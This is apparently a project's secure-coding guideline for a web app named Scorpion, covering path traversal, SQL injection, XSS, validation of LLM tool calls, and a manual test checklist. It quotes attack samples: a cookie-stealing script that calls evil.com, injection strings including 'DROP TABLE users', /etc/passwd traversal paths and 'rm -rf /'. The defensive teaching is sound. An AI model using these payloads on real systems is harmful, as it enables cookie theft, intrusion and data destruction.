# 🛡️ Scorpion Security Guidelines

> "All code vulnerabilities stem from one core mistake: trusting user input."

This document outlines Scorpion's security architecture and mandatory coding practices to prevent common vulnerabilities.

## Table of Contents

1. [Security Principles](#security-principles)
2. [Common Vulnerabilities](#common-vulnerabilities)
3. [Security Rules](#security-rules)
4. [Tools & Utilities](#tools--utilities)
5. [Code Examples](#code-examples)
6. [Testing Security](#testing-security)
7. [Incident Response](#incident-response)

---

## Security Principles

### Core Mandate: Never Trust Input

**All inputs are untrusted**, including:
- HTTP requests (query params, body, headers)
- WebSocket messages
- Tool responses (n8n, external APIs)
- **LLM/Agent outputs** (Claude, GPT, etc.)
- Webhook payloads
- Database content (when displaying to users)
- File uploads

### Defense in Depth

Security is layered:
1. **Input validation** at API boundaries
2. **Sanitization** before storage
3. **Output encoding** before rendering
4. **Parameterized queries** for databases
5. **Path validation** for file operations
6. **Rate limiting** for DOS protection
7. **Security headers** at HTTP layer

---

## Common Vulnerabilities

### 1. Directory Traversal

**The Bug:**
```typescript
// ❌ VULNERABLE
const filename = req.query.file as string;
const path = path.join(process.cwd(), 'uploads', filename);
const data = await fs.readFile(path);
```

**Attack:**
```
GET /api/files?file=../../../etc/passwd
```

**The Fix:**
```typescript
// ✅ SAFE
import { validateFilename, resolveSafePath } from '@/lib/security';

const filename = req.query.file as string;

// Option 1: Validate filename
if (!validateFilename(filename, { allowedExtensions: ['.pdf', '.jpg'] })) {
  return res.status(400).json({ error: 'Invalid filename' });
}

// Option 2: Use safe path resolution
const rootDir = path.resolve(process.cwd(), 'uploads');
const safePath = resolveSafePath(rootDir, filename);
const data = await fs.readFile(safePath);
```

**Best Practice: Use IDs, Not Paths**
```typescript
// ✅ BEST - user provides ID, you control the path
const { id } = req.query;
const record = await db.file.findUnique({ where: { id } });
if (!record) return res.status(404).json({ error: 'Not found' });

// Path comes from DB, never from user
const data = await fs.readFile(record.absolutePath);
```

---

### 2. SQL Injection

**The Bug:**
```typescript
// ❌ VULNERABLE
const email = req.body.email;
const password = req.body.password;
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
const user = await db.query(query);
```

**Attack:**
```
POST /api/login
{
  "email": "user@example.com",
  "password": "x' OR '1'='1' --"
}
```

**The Fix:**
```typescript
// ✅ SAFE - Parameterized query
const { email, password } = req.body;
const user = await db.query(
  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
  [email, hashPassword(password)]
);
```

**With Prisma/ORM:**
```typescript
// ✅ SAFE - ORM handles escaping
const user = await prisma.user.findFirst({
  where: {
    email: email,
    passwordHash: hashPassword(password),
  },
});
```

**For LIKE Queries:**
```typescript
import { escapeSqlLike } from '@/lib/security';

const searchTerm = escapeSqlLike(req.query.search);
const results = await db.query(
  'SELECT * FROM users WHERE name LIKE $1',
  [`%${searchTerm}%`]
);
```

---

### 3. Cross-Site Scripting (XSS)

**The Bug:**
```typescript
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: message.content }} />
```

**Attack:**
```javascript
// Stored in DB:
message.content = '<script>fetch("https://evil.com?cookie=" + document.cookie)</script>'
```

**The Fix:**
```typescript
// ✅ SAFE - React's default escaping
<div>{message.content}</div>

// ✅ SAFE - Sanitized HTML when needed
import { sanitizeHtml } from '@/lib/security/sanitize';

<div dangerouslySetInnerHTML={{
  __html: sanitizeHtml(message.content, {
    allowedTags: ['p', 'strong', 'em', 'code'],
    allowLinks: false,
  })
}} />

// ✅ SAFE - Strip all HTML for plain text
import { stripAllHtml } from '@/lib/security/sanitize';

<div>{stripAllHtml(userInput)}</div>
```

**For Chat Messages:**
```typescript
import { sanitizeChatMessage } from '@/lib/security/sanitize';

// Before storing in DB
const sanitized = sanitizeChatMessage(userMessage);
await db.message.create({
  data: { content: sanitized, userId }
});
```

---

## Security Rules

### Rule 1: NEVER TRUST INPUT

**All inputs (HTTP, WebSocket, tool responses, LLM outputs, webhooks) are untrusted.**

✅ **DO:**
- Validate at the boundary using schemas (Zod, Yup)
- Reject invalid data early
- Use allowlists, not denylists
- Log suspicious inputs

❌ **DON'T:**
- Assume input shape matches TypeScript types
- Trust LLM-generated code/queries/paths
- Concatenate user input into commands/queries

### Rule 2: NO RAW PATHS FROM USERS

**Users never specify filesystem paths.**

✅ **DO:**
- Accept IDs that map to paths in your DB
- Validate filenames with `validateFilename()`
- Use `resolveSafePath()` for path construction
- Verify resolved paths stay within root directory

❌ **DON'T:**
- Use `req.query.path` directly in `fs.readFile()`
- Concatenate user input into file paths
- Trust relative paths from users

### Rule 3: NO STRING-CONCATENATED SQL

**All database calls use parameterized queries or ORM methods.**

✅ **DO:**
- Use `$1, $2` placeholders (Postgres)
- Use `?` placeholders (MySQL)
- Use Prisma/Drizzle for type-safe queries
- Escape LIKE wildcards with `escapeSqlLike()`

❌ **DON'T:**
- Build SQL with template literals
- Concatenate user data into queries
- Trust LLM-generated SQL without validation

### Rule 4: NO RAW HTML FROM USERS

**Never inject unescaped user content into HTML.**

✅ **DO:**
- Use React's default escaping: `<div>{value}</div>`
- Sanitize with `sanitizeHtml()` if HTML is needed
- Strip all HTML with `stripAllHtml()` for plain text
- Set Content-Security-Policy headers

❌ **DON'T:**
- Use `dangerouslySetInnerHTML` with user content
- Render `<script>` tags from user input
- Trust markdown without sanitization

### Rule 5: OUTPUT ENCODING & HEADERS

**Apply proper escaping and security headers.**

✅ **DO:**
- Set `HttpOnly`, `Secure`, `SameSite` on cookies
- Apply CSP, X-Frame-Options, X-Content-Type-Options
- Use `getSecurityHeaders()` in Next.js config
- Escape data based on context (HTML, JS, URL, CSS)

❌ **DON'T:**
- Use `SameSite=None` without good reason
- Allow `Access-Control-Allow-Origin: *` in production
- Disable security headers

### Rule 6: LLM AND TOOL RESPONSES ARE UNTRUSTED

**Treat agent/tool outputs like user input.**

✅ **DO:**
- Validate tool calls with `validateToolCall()`
- Sanitize LLM responses before execution
- Block dangerous patterns (rm -rf, DROP TABLE, etc.)
- Log all tool executions

❌ **DON'T:**
- Execute shell commands from LLM without validation
- Run SQL directly from agent responses
- Allow arbitrary file/URL access

### Rule 7: SECURITY IS TESTED, NOT ASSUMED

**Every security control has tests.**

✅ **DO:**
- Test that `../etc/passwd` is blocked
- Test that `<script>` is escaped or removed
- Test that SQL injection patterns fail
- Run security tests in CI/CD

❌ **DON'T:**
- Ship code without security tests
- Assume libraries are secure
- Skip penetration testing

---

## Tools & Utilities

### Core Security Module

**Location:** [`lib/security/index.ts`](lib/security/index.ts)

```typescript
import {
  validateFilename,
  resolveSafePath,
  stripHtmlTags,
  sanitizeHtml,
  escapeSqlLike,
  validateToolCall,
  SecuritySchemas,
  RateLimiter,
} from '@/lib/security';
```

### Sanitization Module

**Location:** [`lib/security/sanitize.ts`](lib/security/sanitize.ts)

```typescript
import {
  sanitizeHtml,
  stripAllHtml,
  sanitizeMarkdown,
  sanitizeChatMessage,
  sanitizeToolOutput,
} from '@/lib/security/sanitize';
```

### Middleware Module

**Location:** [`lib/security/middleware.ts`](lib/security/middleware.ts)

```typescript
import {
  withSecurity,
  withRateLimit,
  withAuth,
  withValidation,
  withFullSecurity,
} from '@/lib/security/middleware';
```

---

## Code Examples

### Secure File API

```typescript
// apps/scorpion/app/api/files/[id]/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { SecuritySchemas } from '@/lib/security';
import { withSecurity } from '@/lib/security/middleware';
import fs from 'fs/promises';

export const GET = withSecurity(
  {
    rateLimit: { windowMs: 60000, maxRequests: 100 },
    querySchema: SecuritySchemas.uuid,
  },
  async (request: NextRequest, { params }: { params: { id: string } }) => {
    // User provides ID, not path
    const { id } = params;

    // Fetch metadata from DB
    const file = await db.file.findUnique({ where: { id } });
    if (!file) {
      return NextResponse.json({ error: 'Not found' }, { status: 404 });
    }

    // Path comes from DB, never from user
    const fileData = await fs.readFile(file.absolutePath);

    return new NextResponse(fileData, {
      headers: {
        'Content-Type': file.mimeType,
        'Content-Disposition': `attachment; filename="${file.name}"`,
      },
    });
  }
);
```

### Secure Chat API

```typescript
// apps/scorpion/app/api/chat/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { withSecurity } from '@/lib/security/middleware';
import { sanitizeChatMessage } from '@/lib/security/sanitize';
import { z } from 'zod';

const chatSchema = z.object({
  message: z.string().min(1).max(10000),
  conversationId: z.string().uuid(),
});

export const POST = withSecurity(
  {
    rateLimit: { windowMs: 60000, maxRequests: 50 },
    bodySchema: chatSchema,
  },
  async (request: NextRequest) => {
    const body = await request.json();

    // Sanitize before storing
    const sanitized = sanitizeChatMessage(body.message);

    // Store in DB
    const message = await db.message.create({
      data: {
        content: sanitized,
        conversationId: body.conversationId,
      },
    });

    return NextResponse.json({ message });
  }
);
```

### Secure Database Query

```typescript
// Parameterized query
const results = await db.query(
  'SELECT * FROM workflows WHERE name LIKE $1 AND user_id = $2',
  [`%${escapeSqlLike(searchTerm)}%`, userId]
);

// ORM (Prisma)
const results = await prisma.workflow.findMany({
  where: {
    name: {
      contains: searchTerm, // Prisma handles escaping
    },
    userId,
  },
});
```

### Secure UI Rendering

```typescript
// ✅ SAFE - Plain text
<div>{userMessage}</div>

// ✅ SAFE - Sanitized HTML
import { sanitizeHtml } from '@/lib/security/sanitize';

<div dangerouslySetInnerHTML={{
  __html: sanitizeHtml(userMessage, {
    allowedTags: ['p', 'strong', 'em', 'code'],
    allowLinks: false,
  })
}} />

// ✅ SAFE - Markdown (use react-markdown with rehype-sanitize)
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';

<ReactMarkdown rehypePlugins={[rehypeSanitize]}>
  {userMessage}
</ReactMarkdown>
```

### Secure Tool Validation

```typescript
import { validateToolCall } from '@/lib/security';

// Before executing tool
const toolCall = {
  name: 'readFile',
  args: { path: agentProvidedPath },
};

const validation = validateToolCall(toolCall);
if (!validation.safe) {
  throw new Error(`Blocked unsafe tool call: ${validation.reason}`);
}

// Execute tool
const result = await executeTool(toolCall);
```

---

## Testing Security

### Run Security Tests

```bash
# Run all security tests
pnpm test tests/security

# Run with coverage
pnpm test tests/security --coverage

# Run specific test
pnpm test tests/security/security.test.ts
```

### Manual Testing Checklist

**File APIs:**
- [ ] Try `?file=../../../etc/passwd`
- [ ] Try `?file=file.txt%00.jpg` (null byte)
- [ ] Try `?file=/etc/passwd` (absolute path)

**Auth/SQL Endpoints:**
- [ ] Try `password: x' OR '1'='1' --`
- [ ] Try `email: admin@example.com'; DROP TABLE users; --`

**Message Rendering:**
- [ ] Send `<script>alert(1)</script>`
- [ ] Send `<img src=x onerror="alert(1)">`
- [ ] Send `<iframe src="javascript:alert(1)"></iframe>`

**Tool Execution:**
- [ ] Try agent command: `rm -rf /`
- [ ] Try agent SQL: `DROP TABLE users`
- [ ] Try agent file: `../../../etc/passwd`

---

## Incident Response

### If a Vulnerability is Found

1. **Assess Severity:**
   - Critical: Direct data exposure, RCE, privilege escalation
   - High: XSS, SQL injection, auth bypass
   - Medium: Information disclosure, CSRF
   - Low: Missing headers, verbose errors

2. **Immediate Actions:**
   - Notify team in `#security` channel
   - Create private security issue in GitHub
   - Patch vulnerability ASAP
   - Deploy hotfix to production

3. **Post-Incident:**
   - Write test to prevent regression
   - Review similar code patterns
   - Update this document if needed
   - Conduct post-mortem

### Reporting Security Issues

**DO NOT** open public GitHub issues for security vulnerabilities.

Instead:
- Email: [security contact email]
- Create private security advisory
- Direct message to security team lead

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE: Common Weakness Enumeration](https://cwe.mitre.org/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

## Security Council Integration

Scorpion has a built-in Security Council that reviews all operations:

**Location:** [`server/council/securityCouncil.ts`](server/council/securityCouncil.ts)

The Security Council automatically flags:
- API keys/secrets in responses
- Public endpoints without auth
- SQL queries with user input
- File operations with user paths
- HTML rendering with user content
- CORS misconfigurations

This provides an additional safety layer beyond code-level controls.

---

## Quick Reference Card

```typescript
// ✅ File Operations
import { validateFilename, resolveSafePath } from '@/lib/security';
if (!validateFilename(name)) throw new Error('Invalid');
const path = resolveSafePath(rootDir, name);

// ✅ SQL Queries
const result = await db.query('SELECT * FROM t WHERE id = $1', [id]);

// ✅ HTML Rendering
import { sanitizeHtml } from '@/lib/security/sanitize';
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(html) }} />

// ✅ Tool Validation
import { validateToolCall } from '@/lib/security';
const check = validateToolCall(toolCall);
if (!check.safe) throw new Error(check.reason);

// ✅ API Security
import { withSecurity } from '@/lib/security/middleware';
export const POST = withSecurity({ bodySchema }, handler);
```

---

**Last Updated:** [Date]
**Maintained By:** Scorpion Security Team
**Version:** 1.0
